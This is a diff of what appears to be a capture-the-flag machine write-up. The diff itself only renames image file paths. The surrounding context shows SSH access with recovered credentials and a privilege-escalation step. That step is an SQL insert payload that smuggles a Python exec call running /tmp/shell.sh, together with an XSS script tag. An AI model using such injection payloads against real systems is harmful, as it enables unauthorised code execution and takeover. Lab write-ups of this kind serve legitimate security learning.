@@ -70,13 +70,13 @@ When trying to visit it, I just changed the authorization cookie to have the use
 
 Cool, we have credentials. `diego:dCb#1!x0%gjq`. Now we can SSH into the machine as diego.
 
-<figure><img src="../../../.gitbook/assets/image (6) (2) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
 Running a quick sudo check, we can see that we have some ml\_security.pu script we can run.
 
-<figure><img src="../../../.gitbook/assets/image (4) (2) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Here's the full script.
 
@@ -257,7 +257,7 @@ In the database, we also need to include the user, issue, link and the actual re
 
 Here's the payload I used:
 
-<figure><img src="../../../.gitbook/assets/image (7) (2) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```sql
 insert into escalate values ("abc","abc","abc",'hello=exec("""\nimport os\nos.system("/tmp/shell.sh")\nprint("&ErrMsg=%3Cimg%20src=%22http://htb.com%22%20/%3E%3CSCRIPT%3Ealert%28%22xss%22%29%3C/SCRIPT%3E")""")');
